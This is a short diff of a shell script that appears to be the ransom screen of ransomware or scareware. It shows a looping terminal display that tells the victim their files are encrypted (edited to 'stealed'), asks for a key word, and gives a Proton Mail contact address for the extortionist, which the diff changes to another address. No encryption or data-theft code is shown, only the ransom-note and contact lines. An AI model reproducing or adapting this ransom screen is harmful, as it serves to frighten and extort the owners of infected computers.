@@ -17,7 +17,7 @@ while :
 do
 	clear
 	termimage IMG-20240228-WA0000.jpg
- 	echo -e "\033[7;49;91m YOUR FILES ARE ENCRYPTED PLEASE ENTER THE KEY-WORD BELLOW!\033[m"
+ 	echo -e "\033[7;49;91m YOUR FILES ARE STEALED PLEASE ENTER THE KEY-WORD BELLOW!\033[m"
   	echo ""
 	sleep 1
 	echo ""
@@ -46,7 +46,7 @@ do
 		echo ""
 		echo -e "\033[0;49;92m What i can do?\033[m"
 		echo ""
-		echo -e "You can send me a message in\033[0;49;91m userpropez8183718@proton.me\033[m"
+		echo -e "You can send me a message in\033[0;49;91m usersuprop19100@proton.me\033[m"
 		echo "and us can solve your problem."
 		echo ""
 		read -p "press enter to back"
